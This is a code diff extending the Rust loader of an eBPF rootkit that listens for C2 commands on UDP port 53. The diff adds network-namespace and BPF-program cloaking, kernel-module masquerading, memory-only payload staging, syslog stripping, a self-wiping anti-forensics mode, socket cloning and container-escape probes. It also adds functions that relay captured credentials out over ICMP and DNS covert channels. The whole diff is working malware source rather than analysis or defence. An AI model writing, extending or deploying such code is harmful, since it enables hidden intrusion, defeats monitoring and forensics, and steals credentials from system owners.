@@ -12,15 +12,19 @@ use aya_log::EbpfLogger;
 use bytes::BytesMut;
 use clap::Parser;
 use common::{
-    CredentialCapture, EventHeader, RootkitConfig, TimestompEntry, BPF_PIN_PATH,
-    EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH, EVENT_C2_AUTH_FAILED, EVENT_DNS_EXFIL,
-    EVENT_FILE_OBFUSCATED, EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED,
-    EVENT_PROC_HIDDEN, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
+    CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload, RootkitConfig,
+    TimestompEntry, BPF_PIN_PATH, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH,
+    EVENT_BPF_CLOAKED, EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED, EVENT_CONTAINER_PROBE,
+    EVENT_CRED_RELAYED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_ICMP_EXFIL,
+    EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED, EVENT_MODULE_MASQUERADE,
+    EVENT_NETNS_HIDDEN, EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN, EVENT_SOCKET_CLONED,
+    EVENT_SYSLOG_STRIPPED, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
 };
 use log::{debug, error, info, warn};
 use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
 use std::fs;
 use std::path::Path;
+use std::sync::atomic::{AtomicU32, Ordering};
 use std::sync::{Arc, Mutex};
 use tokio::signal;
 use tokio::sync::watch;
@@ -60,6 +64,46 @@ struct Cli {
     /// Pin BPF maps to filesystem for persistence
     #[arg(long)]
     pin_maps: bool,
+
+    /// Enable network namespace hiding (intercepts setns)
+    #[arg(long)]
+    enable_netns_hide: bool,
+
+    /// Enable eBPF program cloaking (hides own prog IDs)
+    #[arg(long)]
+    enable_bpf_cloak: bool,
+
+    /// Enable kernel module masquerading (/proc/modules)
+    #[arg(long)]
+    enable_module_mask: bool,
+
+    /// Enable memory-only payload staging (memfd_create + execveat)
+    #[arg(long)]
+    enable_memfd: bool,
+
+    /// Enable syslog write stripping
+    #[arg(long)]
+    enable_syslog_strip: bool,
+
+    /// Activate bytecode wipe (programs become no-ops for anti-forensics)
+    #[arg(long)]
+    wipe_bytecode: bool,
+
+    /// Enable ICMP covert channel exfiltration
+    #[arg(long)]
+    enable_icmp_exfil: bool,
+
+    /// Enable socket cloning / connection shadowing
+    #[arg(long)]
+    enable_socket_clone: bool,
+
+    /// Enable credential relay over C2
+    #[arg(long)]
+    enable_cred_relay: bool,
+
+    /// Enable container escape probes
+    #[arg(long)]
+    enable_container_probe: bool,
 }
 
 struct C2Maps {
@@ -274,6 +318,167 @@ async fn main() -> Result<()> {
     timestomp_exit.attach("vfs_getattr", 0)?;
     info!("✓ Feature 13: Timestomping (vfs_getattr) loaded");
 
+    // ── New Feature Loading (gated by CLI flags) ──
+
+    // Feature 14: Network Namespace Hiding
+    if cli.enable_netns_hide {
+        let setns_enter: &mut KProbe = bpf
+            .program_mut("shadow_setns_enter")
+            .context("shadow_setns_enter not found")?
+            .try_into()?;
+        setns_enter.load()?;
+        setns_enter.attach("__x64_sys_setns", 0)?;
+        info!("✓ Feature 14: Network Namespace Hiding loaded");
+    }
+
+    // Feature 15: eBPF Program Cloaking
+    if cli.enable_bpf_cloak {
+        let bpf_enter: &mut KProbe = bpf
+            .program_mut("shadow_bpf_enter")
+            .context("shadow_bpf_enter not found")?
+            .try_into()?;
+        bpf_enter.load()?;
+        bpf_enter.attach("__x64_sys_bpf", 0)?;
+
+        let bpf_exit: &mut KProbe = bpf
+            .program_mut("shadow_bpf_exit")
+            .context("shadow_bpf_exit not found")?
+            .try_into()?;
+        bpf_exit.load()?;
+        bpf_exit.attach("__x64_sys_bpf", 0)?;
+        info!("✓ Feature 15: eBPF Program Cloaking loaded");
+    }
+
+    // Feature 16: Kernel Module Masquerading
+    if cli.enable_module_mask {
+        let modules_enter: &mut KProbe = bpf
+            .program_mut("shadow_modules_read_enter")
+            .context("shadow_modules_read_enter not found")?
+            .try_into()?;
+        modules_enter.load()?;
+        modules_enter.attach("vfs_read", 0)?;
+
+        let modules_exit: &mut KProbe = bpf
+            .program_mut("shadow_modules_read_exit")
+            .context("shadow_modules_read_exit not found")?
+            .try_into()?;
+        modules_exit.load()?;
+        modules_exit.attach("vfs_read", 0)?;
+        info!("✓ Feature 16: Kernel Module Masquerading loaded");
+    }
+
+    // Feature 17: Memory-Only Payload Staging
+    if cli.enable_memfd {
+        let memfd_enter: &mut KProbe = bpf
+            .program_mut("shadow_memfd_create_enter")
+            .context("shadow_memfd_create_enter not found")?
+            .try_into()?;
+        memfd_enter.load()?;
+        memfd_enter.attach("__x64_sys_memfd_create", 0)?;
+
+        let memfd_exit: &mut KProbe = bpf
+            .program_mut("shadow_memfd_create_exit")
+            .context("shadow_memfd_create_exit not found")?
+            .try_into()?;
+        memfd_exit.load()?;
+        memfd_exit.attach("__x64_sys_memfd_create", 0)?;
+
+        let execveat: &mut KProbe = bpf
+            .program_mut("shadow_execveat_enter")
+            .context("shadow_execveat_enter not found")?
+            .try_into()?;
+        execveat.load()?;
+        execveat.attach("do_execveat_common", 0)?;
+        info!("✓ Feature 17: Memory-Only Payload Staging loaded");
+    }
+
+    // Feature 18: Syslog Write Stripping
+    if cli.enable_syslog_strip {
+        let syslog_write: &mut KProbe = bpf
+            .program_mut("shadow_syslog_write")
+            .context("shadow_syslog_write not found")?
+            .try_into()?;
+        syslog_write.load()?;
+        syslog_write.attach("ksys_write", 0)?;
+        info!("✓ Feature 18: Syslog Write Stripping loaded");
+    }
+
+    // Feature 19: Anti-Forensics Bytecode Wipe
+    {
+        let wipe_check: &mut KProbe = bpf
+            .program_mut("shadow_wipe_check")
+            .context("shadow_wipe_check not found")?
+            .try_into()?;
+        wipe_check.load()?;
+        wipe_check.attach("__x64_sys_getpid", 0)?;
+        if cli.wipe_bytecode {
+            let mut wipe_flag: HashMap<_, u32, u32> = HashMap::try_from(
+                bpf.map_mut("WIPE_FLAG").context("WIPE_FLAG map not found")?,
+            )?;
+            wipe_flag.insert(0u32, 1u32, 0)?;
+            info!("✓ Feature 19: Bytecode Wipe ACTIVATED — programs are now no-ops");
+        }
+    }
+
+    // Feature 20: ICMP Covert Channel
+    if cli.enable_icmp_exfil {
+        let icmp_prog: &mut SchedClassifier = bpf
+            .program_mut("shadow_icmp_exfil")
+            .context("shadow_icmp_exfil not found")?
+            .try_into()?;
+        icmp_prog.load()?;
+        icmp_prog.attach(&cli.iface, TcAttachType::Egress)?;
+        info!(
+            "✓ Feature 20: ICMP Covert Channel (TC egress) attached to {}",
+            cli.iface
+        );
+    }
+
+    // Feature 21: Socket Cloning
+    if cli.enable_socket_clone {
+        let tcp_sendmsg: &mut KProbe = bpf
+            .program_mut("shadow_tcp_sendmsg")
+            .context("shadow_tcp_sendmsg not found")?
+            .try_into()?;
+        tcp_sendmsg.load()?;
+        tcp_sendmsg.attach("tcp_sendmsg", 0)?;
+        info!("✓ Feature 21: Socket Cloning (tcp_sendmsg) loaded");
+    }
+
+    // Feature 23: Container Escape Probes
+    if cli.enable_container_probe {
+        let unshare: &mut KProbe = bpf
+            .program_mut("shadow_unshare_enter")
+            .context("shadow_unshare_enter not found")?
+            .try_into()?;
+        unshare.load()?;
+        unshare.attach("__x64_sys_unshare", 0)?;
+
+        let commit_creds: &mut KProbe = bpf
+            .program_mut("shadow_commit_creds")
+            .context("shadow_commit_creds not found")?
+            .try_into()?;
+        commit_creds.load()?;
+        commit_creds.attach("commit_creds", 0)?;
+        info!("✓ Feature 23: Container Escape Probes loaded");
+    }
+
+    // Populate OWN_PROG_IDS for cloaking (after all programs are loaded)
+    if cli.enable_bpf_cloak {
+        let mut own_prog_ids: HashMap<_, u32, u8> = HashMap::try_from(
+            bpf.map_mut("OWN_PROG_IDS")
+                .context("OWN_PROG_IDS map not found")?,
+        )?;
+        for (_name, prog) in bpf.programs() {
+            if let Some(info) = prog.info().ok() {
+                if let Ok(id) = info.id() {
+                    own_prog_ids.insert(id, 1u8, 0)?;
+                }
+            }
+        }
+        info!("✓ OWN_PROG_IDS populated for cloaking");
+    }
+
     // Apply CLI configurations
     if let Some(pid) = cli.hide_pid {
         let mut hidden_pids: HashMap<_, u32, u8> = HashMap::try_from(
@@ -348,8 +553,35 @@ async fn main() -> Result<()> {
 
     let (kill_tx, mut kill_rx) = watch::channel(false);
 
+    // Extract ICMP exfil queue map if enabled
+    let icmp_queue: Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>> =
+        if cli.enable_icmp_exfil && cli.enable_cred_relay {
+            bpf.take_map("ICMP_EXFIL_QUEUE")
+                .and_then(|m| HashMap::try_from(m).ok())
+                .map(|m| Arc::new(Mutex::new(m)))
+        } else {
+            None
+        };
+
+    // Extract DNS exfil queue map for relay if enabled
+    let dns_queue: Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>> =
+        if cli.enable_cred_relay && !cli.enable_icmp_exfil {
+            bpf.take_map("DNS_EXFIL_QUEUE")
+                .and_then(|m| HashMap::try_from(m).ok())
+                .map(|m| Arc::new(Mutex::new(m)))
+        } else {
+            None
+        };
+
     // Start event monitoring with C2 dispatch
-    tokio::spawn(monitor_events(bpf, Arc::clone(&c2_maps), kill_tx));
+    tokio::spawn(monitor_events(
+        bpf,
+        Arc::clone(&c2_maps),
+        kill_tx,
+        icmp_queue,
+        dns_queue,
+        cli.enable_cred_relay,
+    ));
 
     info!("🚀 Rootkit active. Press Ctrl+C to detach and exit.");
     info!("📡 Listening for C2 commands on UDP port 53...");
@@ -382,7 +614,14 @@ fn pin_all_maps(bpf: &mut Ebpf) -> Result<()> {
     Ok(())
 }
 
-async fn monitor_events(mut bpf: Ebpf, c2_maps: Arc<C2Maps>, kill_tx: watch::Sender<bool>) {
+async fn monitor_events(
+    mut bpf: Ebpf,
+    c2_maps: Arc<C2Maps>,
+    kill_tx: watch::Sender<bool>,
+    icmp_queue: Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>,
+    dns_queue: Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>,
+    cred_relay: bool,
+) {
     let events_map = match bpf.take_map("EVENTS") {
         Some(map) => map,
         None => {
@@ -416,6 +655,8 @@ async fn monitor_events(mut bpf: Ebpf, c2_maps: Arc<C2Maps>, kill_tx: watch::Sen
     let cpus = aya::util::online_cpus().unwrap_or_else(|_| vec![0]);
     info!("Event monitoring started on {} CPUs", cpus.len());
 
+    let dns_seq = Arc::new(AtomicU32::new(0));
+
     for cpu in cpus.iter() {
         if let Ok(buf) = events.open(*cpu, None) {
             let maps = Arc::clone(&c2_maps);
@@ -425,8 +666,12 @@ async fn monitor_events(mut bpf: Ebpf, c2_maps: Arc<C2Maps>, kill_tx: watch::Sen
             });
         }
         if let Ok(buf) = cred_events.open(*cpu, None) {
+            let icmp_q = icmp_queue.clone();
+            let dns_q = dns_queue.clone();
+            let do_relay = cred_relay;
+            let seq = Arc::clone(&dns_seq);
             tokio::spawn(async move {
-                process_cred_buf(buf).await;
+                process_cred_buf(buf, do_relay, icmp_q, dns_q, seq).await;
             });
         }
     }
@@ -463,7 +708,13 @@ async fn process_event_buf(
     }
 }
 
-async fn process_cred_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>) {
+async fn process_cred_buf(
+    mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>,
+    cred_relay: bool,
+    icmp_queue: Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>,
+    dns_queue: Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>,
+    dns_seq: Arc<AtomicU32>,
+) {
     let mut bufs = (0..10)
         .map(|_| BytesMut::with_capacity(1024))
         .collect::<Vec<_>>();
@@ -480,6 +731,10 @@ async fn process_cred_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<ay
                 let capture =
                     unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const CredentialCapture) };
                 log_credential_capture(&capture);
+                if cred_relay {
+                    relay_credential_to_icmp(&capture, &icmp_queue);
+                    relay_credential_to_dns(&capture, &dns_queue, &dns_seq);
+                }
             }
         }
     }
@@ -574,11 +829,67 @@ fn log_event(event: &EventHeader) {
         EVENT_TELEMETRY_MUTED => {
             debug!("Telemetry muted: PID={}", event.pid);
         }
+        EVENT_NETNS_HIDDEN => {
+            info!(
+                "Netns hidden: PID={}, netns_ino={}",
+                event.pid, event.context
+            );
+        }
+        EVENT_BPF_CLOAKED => {
+            debug!(
+                "BPF program cloaked: PID={}, prog_id={}",
+                event.pid, event.context
+            );
+        }
+        EVENT_MODULE_MASQUERADE => {
+            debug!(
+                "Module masquerade: PID={}, inode={}",
+                event.pid, event.context
+            );
+        }
+        EVENT_MEMFD_STAGED => {
+            info!(
+                "Memfd payload staged: PID={}, fd={}",
+                event.pid, event.context
+            );
+        }
+        EVENT_SYSLOG_STRIPPED => {
+            debug!(
+                "Syslog stripped: PID={}, bytes={}",
+                event.pid, event.context
+            );
+        }
+        EVENT_BYTECODE_WIPED => {
+            warn!("Bytecode wipe confirmed: PID={}", event.pid);
+        }
+        EVENT_ICMP_EXFIL => {
+            debug!("ICMP exfil sent: seq={}", event.context);
+        }
+        EVENT_SOCKET_CLONED => {
+            debug!(
+                "Socket cloned: PID={}, cookie={}",
+                event.pid, event.context
+            );
+        }
+        EVENT_CRED_RELAYED => {
+            info!(
+                "Credential relayed: PID={}, bytes={}",
+                event.pid, event.context
+            );
+        }
+        EVENT_CONTAINER_PROBE => {
+            info!(
+                "Container probe: PID={}, ns_ino={}",
+                event.pid, event.context
+            );
+        }
         _ => {
             debug!("Unknown event: type={}", event.event_type);
         }
     }
 }
+
+static ICMP_EXFIL_SEQ: AtomicU32 = AtomicU32::new(0);
 
 fn log_credential_capture(capture: &CredentialCapture) {
     let data_str = String::from_utf8_lossy(&capture.data[..capture.data_len as usize]);
@@ -586,4 +897,49 @@ fn log_credential_capture(capture: &CredentialCapture) {
         "Credential captured: PID={}, FD={}, data={:?}",
         capture.pid, capture.fd, data_str
     );
+}
+
+fn relay_credential_to_icmp(
+    capture: &CredentialCapture,
+    icmp_queue: &Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>,
+) {
+    let queue = match icmp_queue {
+        Some(q) => q,
+        None => return,
+    };
+    let seq = ICMP_EXFIL_SEQ.fetch_add(1, Ordering::Relaxed);
+    let mut payload = IcmpExfilPayload {
+        seq,
+        data_len: capture.data_len.min(56),
+        data: [0u8; 56],
+    };
+    let len = payload.data_len as usize;
+    payload.data[..len].copy_from_slice(&capture.data[..len]);
+    if let Ok(mut map) = queue.lock() {
+        let _ = map.insert(seq, payload, 0);
+    }
+    debug!("Credential relayed via ICMP: seq={}, bytes={}", seq, len);
+}
+
+fn relay_credential_to_dns(
+    capture: &CredentialCapture,
+    dns_queue: &Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>,
+    seq_counter: &AtomicU32,
+) {
+    let queue = match dns_queue {
+        Some(q) => q,
+        None => return,
+    };
+    let seq = seq_counter.fetch_add(1, Ordering::Relaxed);
+    let mut chunk = DnsExfilChunk {
+        seq,
+        data_len: capture.data_len.min(64),
+        data: [0u8; 64],
+    };
+    let len = chunk.data_len as usize;
+    chunk.data[..len].copy_from_slice(&capture.data[..len]);
+    if let Ok(mut map) = queue.lock() {
+        let _ = map.insert(seq, chunk, 0);
+    }
+    debug!("Credential relayed via DNS: seq={}, bytes={}", seq, len);
 }
